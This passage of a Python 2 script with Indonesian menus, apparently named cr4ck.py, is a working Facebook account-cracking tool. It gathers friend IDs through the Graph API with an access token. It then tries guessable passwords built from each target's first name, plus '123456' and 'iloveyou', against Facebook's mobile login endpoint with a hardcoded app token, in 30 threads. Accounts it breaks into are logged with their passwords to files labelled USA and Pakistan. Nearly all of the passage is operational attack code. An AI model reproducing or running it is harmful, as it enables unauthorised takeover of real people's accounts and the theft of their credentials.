    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mSelesai ...'
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;96mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;96mCP \x1b[1;96mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/bangla.txt'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m{<\x1b[1;96mKembali\x1b[1;97m>}')
    os.system('python2 cr4ck.py')
def crack_usa():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;95m01\x1b[1;97m} Crack Dari Daftar Teman'
    print '\x1b[1;97m{\x1b[1;95m02\x1b[1;97m} Crack Dari Publik/Teman'
    print '\x1b[1;97m{\x1b[1;95m03\x1b[1;97m} Crack Dari File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Kembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_usa()
def pilih_usa():
    teak = raw_input('\x1b[1;95m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar !'
        pilih_usa()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik/teman tidak ada !'
                raw_input('\n\x1b[1;95m[\x1b[1;97m<Kembali>\x1b[1;95m]')
                crack_usa()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
                keluar()
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])
        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama File\x1b[1;91m :\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
                raw_input('\n\x1b[1;95m[\x1b[1;97m<Kembali>\x1b[1;95m]')
                crack_usa()
        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
            pilih_usa()
        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mStop Tekan CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mCrack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)
    print '\n\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mGunakan Mode Pesawat Jika Tidak Ada Hasil'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/usa.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos1
                cek = open('done/usa.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/usa.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos2
                    cek = open('done/usa.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/usa.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos3
                        cek = open('done/usa.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/usa.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos4
                            cek = open('done/usa.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'iloveyou'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/usa.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos5
                                cek = open('done/usa.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mSelesai ...'
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;95mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;95m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;95mCP \x1b[1;95mfile tersimpan \x1b[1;91m: \x1b[1;92mdone/usa.txt'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m{<\x1b[1;95mKembali\x1b[1;97m>}')
    os.system('python2 cr4ck.py')
def crack_pakis():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;91m01\x1b[1;97m} Crack Dari Daftar Teman'
    print '\x1b[1;97m{\x1b[1;91m02\x1b[1;97m} Crack Dari Publik/Teman'
    print '\x1b[1;97m{\x1b[1;91m03\x1b[1;97m} Crack Dari File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Kembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_pakis()
def pilih_pakis():
    teak = raw_input('\x1b[1;91m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar !'
        pilih_pakis()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik/teman tidak ada !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Kembali>\x1b[1;91m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
                keluar()
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])
        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mNama File\x1b[1;91m :\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Kembali>\x1b[1;91m]')
                crack_pakis()
        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar !'
            pilih_pakis()
        print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mStop Tekan CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mCrack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)
    print '\n\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mGunakan Mode Pesawat Jika Tidak Ada Hasil'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass
        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/pakis.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos1
                cek = open('done/pakis.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/pakis.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
